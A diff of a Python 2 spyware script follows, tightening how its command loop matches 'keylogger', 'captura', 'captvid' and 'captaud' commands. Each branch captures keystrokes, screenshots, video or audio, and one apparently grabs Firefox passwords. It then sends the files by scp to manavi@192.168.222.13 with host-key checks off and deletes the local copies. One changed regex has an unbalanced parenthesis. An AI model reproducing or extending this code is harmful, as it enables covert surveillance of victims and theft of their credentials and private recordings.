@@ -48,14 +48,14 @@ for c in comandos:
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.13:~/contrasenas/ 1>/dev/null')
                 os.system('rm -f /tmp/firepass.txt')
 
-    elif re.search('keylogger',c):
+    elif re.match('keylogger (\d+)',c):
 		print c+"\n"
                 mo = re.match('keylogger (\d+)',c)
         	keylogger.keylog(mo.group(1))
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.13:~/keylogger/ 1>/dev/null')
                 os.system('rm -f /tmp/key.txt')
     
-    elif re.search('captura',c):
+    elif re.match('captura (\-[tn]{1,1}) (\d+))',c):
 		print c+"\n"
                 mo = re.match('captura (\-[tn]{1,1}) (\d+)',c);
                 captura.tiempo(mo.group(1),mo.group(2))
@@ -63,14 +63,14 @@ for c in comandos:
                 os.system('rm -f /tmp/*.png')
 
  
-    elif re.search('captvid',c):
+    elif re.match('captvid (\d+)',c):
 		print c+"\n"
                 mo = re.match('captvid (\d+)',c);
                 capvideo.video(mo.group(1))
                 os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.13:~/video/ 1>/dev/null')
                 os.system('rm -f /tmp/*.mpeg')
     
-    elif re.search('captaud',c):
+    elif re.match('captaud (\d+)',c):
 		print c+"\n"
                 mo = re.match('captaud (\d+)',c);
                 capaudio.audio(mo.group(1))
